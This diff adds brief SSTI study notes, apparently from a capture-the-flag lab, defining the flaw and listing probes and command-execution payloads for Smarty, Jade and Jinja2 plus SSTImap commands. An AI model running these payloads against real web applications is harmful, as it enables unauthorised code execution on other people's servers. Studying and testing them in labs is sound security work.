@@ -1,0 +1,14 @@
+Server-side template Injection, or SSTI, is a vulnerability that occurs when user input is injected into a template engine of an application. This can lead to a range of security issues, including code execution, data exposure, privilege escalation, and Denial of Service (DoS). SSTI vulnerabilities are often found in web applications that use template engines to generate dynamic content and can have serious consequences if left unaddressed.
+{{7*'7'}}
+#{7*7}
+{'Hello'|upper} - smarty
+7c45b2d3a741398826f497d58b73a401.txt index.php smarty-3.1.30 smarty-3.1.30
+{system("ls")} - smarty-exploitation
+
+#{root.process.mainModule.require('child_process').spawnSync('ls', ['-lah']).stdout} - jADE EXPLOITATION
+
+{{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output(['ls', '-lah'])}} - Jinja
+
+git clone https://github.com/vladko312/SSTImap.git   - automated ssti.txt detection
+
+python3 sstimap.py -X POST -u 'http://ssti.thm:8002/mako/' -d 'page='  - syntax for automation
